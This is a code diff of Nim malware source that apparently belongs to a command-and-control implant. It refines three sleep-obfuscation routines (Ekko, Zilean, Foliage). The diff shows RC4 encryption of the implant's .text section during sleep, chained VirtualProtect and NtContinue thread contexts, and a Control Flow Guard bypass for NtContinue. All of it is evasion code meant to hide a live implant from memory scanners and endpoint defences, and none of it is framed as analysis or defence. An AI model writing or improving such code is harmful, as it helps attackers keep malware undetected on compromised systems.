@@ -273,7 +273,7 @@ proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, hWakeupEvent: HAN
         ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
         ctx[gadget].Rcx = cast[DWORD64](img.Buffer)
         ctx[gadget].Rdx = cast[DWORD64](img.Length)
-        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
+        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READ)
         ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
         inc gadget
 
@@ -441,7 +441,7 @@ proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, hWakeupEvent: H
         ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
         ctx[gadget].Rcx = cast[DWORD64](img.Buffer)
         ctx[gadget].Rdx = cast[DWORD64](img.Length)
-        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
+        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READ)
         ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
         inc gadget
 
@@ -548,7 +548,7 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int, hWakeupEvent: 
         ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
         ctx[gadget].Rcx = cast[DWORD64](img.Buffer)
         ctx[gadget].Rdx = cast[DWORD64](img.Length)
-        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
+        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READ)
         ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
         inc gadget
         
@@ -640,15 +640,20 @@ proc sleepObfuscate*(sleepSettings: SleepSettings, hWakeupEvent: HANDLE) =
     # Add NtContinue to the Control Flow Guard allow list to make Ekko work in processes protected by CFG
     discard evadeCFG(apis.NtContinue)
 
-    # Locate image base and size
+    # Locate .text section for encryption
     var imageBase = GetModuleHandleA(NULL)
-    var imageSize = (cast[PIMAGE_NT_HEADERS](imageBase + (cast[PIMAGE_DOS_HEADER](imageBase)).e_lfanew)).OptionalHeader.SizeOfImage
-    img.Buffer = cast[PVOID](imageBase)
-    img.Length = imageSize
+    var ntHeaders = cast[PIMAGE_NT_HEADERS](cast[uint](imageBase) + cast[uint]((cast[PIMAGE_DOS_HEADER](imageBase)).e_lfanew))
+    var sectionHeader = cast[ptr IMAGE_SECTION_HEADER](cast[uint](addr ntHeaders.OptionalHeader) + ntHeaders.FileHeader.SizeOfOptionalHeader)
+    for i in 0 ..< int(ntHeaders.FileHeader.NumberOfSections):
+        var section = cast[ptr IMAGE_SECTION_HEADER](cast[uint](sectionHeader) + cast[uint](i * sizeof(IMAGE_SECTION_HEADER)))
+        if equalMem(addr section.Name, cstring(".text"), 5):
+            img.Buffer = cast[PVOID](cast[uint](imageBase) + cast[uint](section.VirtualAddress))
+            img.Length = section.Misc.VirtualSize
+            break
 
     # Generate random encryption key
     var keyBuffer: string = Bytes.toString(generateBytes(KeyRC4)) 
-    key.Buffer = addr keyBuffer
+    key.Buffer = cast[PVOID](addr keyBuffer[0]) 
     key.Length = cast[DWORD](keyBuffer.len())
 
     # Execute sleep obfuscation technique
